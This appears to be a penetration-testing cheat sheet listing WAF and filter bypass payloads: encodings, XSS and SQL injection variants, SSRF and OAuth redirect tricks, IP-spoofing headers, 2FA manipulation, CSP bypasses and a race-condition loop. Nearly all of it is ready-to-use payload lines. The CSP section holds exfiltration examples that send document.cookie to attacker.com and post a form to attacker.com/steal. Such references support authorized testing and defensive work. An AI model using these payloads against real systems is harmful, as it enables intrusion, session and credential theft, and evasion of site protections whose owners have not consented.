# Bypasses

WAF evasion, filter bypass, and encoding tricks.

## URL Encoding

```
< = %3C          > = %3E
" = %22          ' = %27
/ = %2F          \ = %5C
? = %3F          = = %3D
& = %26          # = %23
```

## Double URL Encoding

```
< = %253C        > = %253E
/ = %252F        . = %252e
```

## Unicode Encoding

```
< = \u003c       > = \u003e
< = %u003c       ' = \u0027
```

## HTML Entities

```
< = &lt;         > = &gt;
" = &quot;       ' = &#39;
' = &#x27;       / = &#x2f;
```

## Overlong UTF-8

```
< = %c0%bc       > = %c0%be
/ = %c0%af       . = %c0%ae
```

## Case Manipulation

```html
<ScRiPt>         <SCRIPT>
SeLeCt           UNION
```

## Space Alternatives

```
%09 (tab)        %0a (newline)
%0d (CR)         %0c (form feed)
%20 (space)      + (URL space)
/**/ (SQL/JS)    / (in tags: <svg/onload>)
```

## Null Bytes

```
%00              \0
\x00             &#x00;
```

## Newline Injection

```
%0d%0a           \r\n
%0a              \n
%0d              \r
```

## IP Obfuscation

```
127.0.0.1 = 2130706433      (decimal)
127.0.0.1 = 0x7f000001      (hex)
127.0.0.1 = 0177.0.0.1      (octal)
127.0.0.1 = 127.1           (short)
127.0.0.1 = [::1]           (IPv6)
127.0.0.1 = [::ffff:127.0.0.1]
```

## Unicode/Homograph

```
a = а (Cyrillic)
e = е (Cyrillic)
o = ο (Greek)
. = 。(fullwidth)
/ = ／ (fullwidth)
```

## Path Traversal Bypass

```
../              ..\/
....//           ..;/
..%2f            %2e%2e%2f
%252e%252e%252f  ..%c0%af
..%ef%bc%8f      ....\/
..%00/           ..%0d%0a/
```

## XSS Filter Bypass

### Tag Alternatives

```html
<script> blocked? Try:
<svg onload=...>
<img src=x onerror=...>
<body onload=...>
<input onfocus=... autofocus>
<details open ontoggle=...>
<marquee onstart=...>
<video><source onerror=...>
<iframe srcdoc="<script>...">
```

### Event Handler Alternatives

```
onclick          ondblclick
onmouseover      onmouseenter
onfocus          onblur
onerror          onload
onanimationend   ontransitionend
onbegin          onpageshow
```

### Without Parentheses

```javascript
alert`1`
onerror=alert;throw 1
location='javascript:alert(1)'
```

### Keyword Splitting

```html
<scr<script>ipt>
<scr%00ipt>
```

## SQLi Filter Bypass

### Comment Injection

```sql
/**/             /*!50000*/
#                -- -
;%00
```

### Keyword Bypass

```sql
UNION → UN/**/ION → /*!UNION*/
SELECT → /*!50000SELECT*/
AND → && → %26%26
OR → || → %7c%7c
```

### Whitespace Bypass

```sql
SELECT%09username%09FROM%09users
SELECT%0ausername%0aFROM%0ausers
SELECT/**/username/**/FROM/**/users
```

## SSRF Filter Bypass

### Localhost Bypass

```
http://127.1/
http://0/
http://2130706433/
http://[::1]/
http://127.0.0.1.nip.io/
```

### URL Parser Confusion

```
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/
http://127.0.0.1#@evil.com
http://127.0.0.1%00@evil.com
```

### DNS Rebinding

```
attacker.com → 8.8.8.8 (check)
attacker.com → 127.0.0.1 (request)
```

## Rate Limit Bypass

### IP Header Spoofing

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 10.0.0.1
X-Originating-IP: 192.168.1.1
True-Client-IP: 172.16.0.1
X-Client-IP: 1.2.3.4
CF-Connecting-IP: 5.6.7.8
X-Remote-IP: 9.10.11.12
X-Remote-Addr: 13.14.15.16
```

### Session/Endpoint Rotation

```
# Different session per request
# Different casing: /api/user vs /API/USER
# Add trailing: /api/user/
# Add params: /api/user?x=1
```

## Auth Bypass

### Response Manipulation

```json
{"success": false} → {"success": true}
{"2fa_required": true} → delete field
HTTP/1.1 401 → HTTP/1.1 200
```

### Parameter Pollution

```
?code=000000&code=123456
?code[]=000000&code[]=123456
{"code":["000000","123456"]}
```

### Null/Blank Values

```
code=
code=null
code=000000
code=undefined
```

## OAuth/Redirect Bypass

```
redirect_uri=https://evil.com
redirect_uri=https://legit.com/callback/../../../evil
redirect_uri=https://legit.com@evil.com
redirect_uri=https://legit.com%00.evil.com
redirect_uri=https://lеgit.com  (Cyrillic е)
```

## CSP Bypass

### Missing Directives

```html
<!-- No object-src -->
<object data="javascript:alert(1)">

<!-- No base-uri -->
<base href="https://attacker.com/">

<!-- No form-action -->
<form action="https://attacker.com/steal">
```

### Exfiltration

```html
<!-- Via img (usually allowed) -->
<img src="https://attacker.com/?c="+document.cookie>

<!-- Via DNS prefetch -->
<link rel="dns-prefetch" href="//data.attacker.com">
```

## HTTP Method Override

```http
X-HTTP-Method-Override: PUT
X-Method-Override: DELETE
X-HTTP-Method: PATCH
```

## Host Header Tricks

```http
Host: evil.com
Host: target.com@evil.com
Host: target.com%00.evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
```

## Content-Type Tricks

```
application/json → application/x-www-form-urlencoded
application/xml → text/xml
multipart/form-data → application/json
```

## WAF-Specific

### Cloudflare

```html
<details open ontoggle=alert(1)>
<svg/onload=location='javascript:alert(1)'>
```

### Akamai

```html
<img src=x onerror=prompt(1)>
<img src=x onerror=confirm(1)>
```

### ModSecurity

```sql
' /*!50000OR*/ 1=1--
' /*!UNION*/ /*!SELECT*/ 1--
```

## Race Condition Bypass (2FA/Rate Limit)

```python
# HTTP/2 single-packet
# Turbo Intruder with gate
for i in range(50):
    engine.queue(target.req, gate='race1')
engine.openGate('race1')
```

---

!!! tip "Test Systematically"
    Understand what's blocked, then find the specific bypass. Don't random spray.

---
*Combine techniques: encoding + case + comments often works together.*
